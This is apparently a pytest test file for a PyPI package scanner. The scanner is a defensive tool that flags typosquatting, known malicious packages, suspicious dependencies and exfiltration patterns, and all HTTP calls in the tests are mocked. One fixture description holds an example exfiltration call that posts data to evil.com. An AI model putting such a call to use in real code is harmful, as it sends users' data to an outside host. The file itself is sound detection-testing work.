"""Tests for PyPIScanner — all HTTP calls mocked.

Validates PyPI package search, metadata analysis, dependency checking,
typosquatting detection, and content pattern matching.
"""

from __future__ import annotations

import asyncio
from typing import Any
from unittest.mock import AsyncMock, patch

import pytest

from skillfortify.registry.base import RegistryEntry
from skillfortify.registry.pypi_scanner import (
    KNOWN_MALICIOUS_PACKAGES,
    PyPIScanner,
    _info_to_entry,
)


# ---------------------------------------------------------------------------
# Fixtures and helpers
# ---------------------------------------------------------------------------


def _make_pypi_info(
    name: str = "test-package",
    version: str = "1.0.0",
    summary: str = "A test package",
    author: str = "tester",
    requires_dist: list[str] | None = None,
    description: str = "",
) -> dict[str, Any]:
    """Build a mock PyPI package info dict."""
    return {
        "info": {
            "name": name,
            "version": version,
            "summary": summary,
            "author": author,
            "project_url": f"https://pypi.org/project/{name}/",
            "requires_dist": requires_dist,
            "description": description,
            "maintainer": "",
        }
    }


@pytest.fixture
def scanner() -> PyPIScanner:
    """Create a PyPIScanner instance."""
    return PyPIScanner()


def _patch_fetch_json(return_value: Any) -> Any:
    """Patch http_client.fetch_json for PyPI scanner."""
    return patch(
        "skillfortify.registry.pypi_scanner.fetch_json",
        new_callable=AsyncMock,
        return_value=return_value,
    )


# ---------------------------------------------------------------------------
# Tests: registry_name
# ---------------------------------------------------------------------------


class TestPyPIRegistryName:
    """Tests for the registry name property."""

    def test_name(self, scanner: PyPIScanner) -> None:
        """Scanner reports 'PyPI'."""
        assert scanner.registry_name == "PyPI"


# ---------------------------------------------------------------------------
# Tests: fetch_entries
# ---------------------------------------------------------------------------


class TestFetchEntries:
    """Tests for PyPIScanner.fetch_entries."""

    def test_fetch_with_keyword(self, scanner: PyPIScanner) -> None:
        """Fetching with a keyword searches for that package."""
        data = _make_pypi_info(name="mcp-server-test")
        with _patch_fetch_json(data):
            entries = asyncio.run(
                scanner.fetch_entries(limit=10, keyword="mcp-server-test")
            )
        assert len(entries) == 1
        assert entries[0].name == "mcp-server-test"

    def test_fetch_default_keywords(self, scanner: PyPIScanner) -> None:
        """Without keyword, searches default agent-tool keywords."""
        data = _make_pypi_info(name="mcp-server")
        with _patch_fetch_json(data):
            entries = asyncio.run(scanner.fetch_entries(limit=10))
        # Should have results from at least the first default keyword
        assert len(entries) >= 1

    def test_fetch_deduplicates(self, scanner: PyPIScanner) -> None:
        """Same package from different keywords is deduplicated."""
        data = _make_pypi_info(name="mcp-server")
        with _patch_fetch_json(data):
            entries = asyncio.run(scanner.fetch_entries(limit=100))
        names = [e.name for e in entries]
        assert len(names) == len(set(names))

    def test_fetch_empty_response(self, scanner: PyPIScanner) -> None:
        """Empty API response returns empty list."""
        with _patch_fetch_json({}):
            entries = asyncio.run(
                scanner.fetch_entries(keyword="nonexistent")
            )
        assert entries == []

    def test_fetch_respects_limit(self, scanner: PyPIScanner) -> None:
        """Does not return more than 'limit' entries."""
        data = _make_pypi_info(name="pkg")
        with _patch_fetch_json(data):
            entries = asyncio.run(scanner.fetch_entries(limit=1))
        assert len(entries) <= 1


# ---------------------------------------------------------------------------
# Tests: scan_entry
# ---------------------------------------------------------------------------


class TestScanEntry:
    """Tests for PyPIScanner.scan_entry."""

    def test_safe_package(self, scanner: PyPIScanner) -> None:
        """Clean package produces no findings."""
        entry = RegistryEntry(
            name="clean-pkg",
            url="https://pypi.org/project/clean-pkg/",
            description="A safe package",
        )
        data = _make_pypi_info(name="clean-pkg", author="legit-author")
        with _patch_fetch_json(data):
            result = asyncio.run(scanner.scan_entry(entry))
        assert result.is_safe
        assert result.skill_name == "pypi:clean-pkg"

    def test_known_malicious(self, scanner: PyPIScanner) -> None:
        """Known malicious package triggers CRITICAL."""
        malicious_name = next(iter(KNOWN_MALICIOUS_PACKAGES))
        entry = RegistryEntry(
            name=malicious_name,
            url=f"https://pypi.org/project/{malicious_name}/",
        )
        data = _make_pypi_info(name=malicious_name)
        with _patch_fetch_json(data):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe
        assert any(f.attack_class == "known_malicious" for f in result.findings)

    def test_typosquatting_detection(self, scanner: PyPIScanner) -> None:
        """Typosquatting indicator triggers CRITICAL."""
        entry = RegistryEntry(name="openaai-agent-tool", url="https://pypi.org/")
        data = _make_pypi_info(name="openaai-agent-tool")
        with _patch_fetch_json(data):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe
        assert any("typosquatting" in f.attack_class for f in result.findings)

    def test_suspicious_dependency(self, scanner: PyPIScanner) -> None:
        """Package with suspicious dependency triggers CRITICAL."""
        entry = RegistryEntry(name="agent-lib", url="https://pypi.org/")
        data = _make_pypi_info(
            name="agent-lib",
            requires_dist=["click>=8.0", "pycryptoenv>=1.0"],
        )
        with _patch_fetch_json(data):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe
        assert any(
            f.attack_class == "malicious_dependency" for f in result.findings
        )

    def test_missing_author(self, scanner: PyPIScanner) -> None:
        """Missing author triggers MEDIUM finding."""
        entry = RegistryEntry(name="orphan-pkg", url="https://pypi.org/")
        data = _make_pypi_info(name="orphan-pkg", author="")
        data["info"]["maintainer"] = ""
        with _patch_fetch_json(data):
            result = asyncio.run(scanner.scan_entry(entry))
        assert any(
            f.attack_class == "missing_provenance" for f in result.findings
        )

    def test_description_with_exfil_pattern(self, scanner: PyPIScanner) -> None:
        """Exfiltration pattern in description triggers finding."""
        entry = RegistryEntry(
            name="bad-desc",
            url="https://pypi.org/",
            description='httpx.post("https://evil.com/data")',
        )
        data = _make_pypi_info(name="bad-desc", author="anon")
        with _patch_fetch_json(data):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe

    def test_long_description_scanned(self, scanner: PyPIScanner) -> None:
        """Long description (README) in metadata is scanned for dangerous patterns."""
        entry = RegistryEntry(name="long-desc", url="https://pypi.org/")
        # Use a pattern our regex detects: subprocess.run
        data = _make_pypi_info(
            name="long-desc",
            author="author",
            description="Uses subprocess.run to execute commands",
        )
        with _patch_fetch_json(data):
            result = asyncio.run(scanner.scan_entry(entry))
        assert not result.is_safe

    def test_clean_dependencies(self, scanner: PyPIScanner) -> None:
        """Legitimate dependencies produce no findings."""
        entry = RegistryEntry(name="good-pkg", url="https://pypi.org/")
        data = _make_pypi_info(
            name="good-pkg",
            author="author",
            requires_dist=["click>=8.0", "rich>=13.0", "httpx>=0.27"],
        )
        with _patch_fetch_json(data):
            result = asyncio.run(scanner.scan_entry(entry))
        dep_findings = [
            f for f in result.findings if f.attack_class == "malicious_dependency"
        ]
        assert len(dep_findings) == 0

    def test_metadata_fetch_failure(self, scanner: PyPIScanner) -> None:
        """Graceful handling when metadata fetch returns empty."""
        entry = RegistryEntry(name="missing-pkg", url="https://pypi.org/")
        with _patch_fetch_json({}):
            result = asyncio.run(scanner.scan_entry(entry))
        # Should not crash, may or may not have findings
        assert isinstance(result.is_safe, bool)


# ---------------------------------------------------------------------------
# Tests: _info_to_entry helper
# ---------------------------------------------------------------------------


class TestInfoToEntry:
    """Tests for the _info_to_entry conversion helper."""

    def test_basic_conversion(self) -> None:
        """Standard info dict converts correctly."""
        info = {
            "name": "my-pkg",
            "version": "2.0.0",
            "summary": "My package",
            "author": "me",
            "project_url": "https://pypi.org/project/my-pkg/",
        }
        entry = _info_to_entry(info)
        assert entry.name == "my-pkg"
        assert entry.version == "2.0.0"
        assert entry.author == "me"

    def test_missing_fields_default(self) -> None:
        """Missing fields default to empty strings."""
        entry = _info_to_entry({})
        assert entry.name == ""
        assert entry.version == ""
        assert entry.description == ""

    def test_long_summary_truncated(self) -> None:
        """Summary longer than 500 chars is truncated."""
        info = {"name": "x", "summary": "a" * 1000}
        entry = _info_to_entry(info)
        assert len(entry.description) == 500
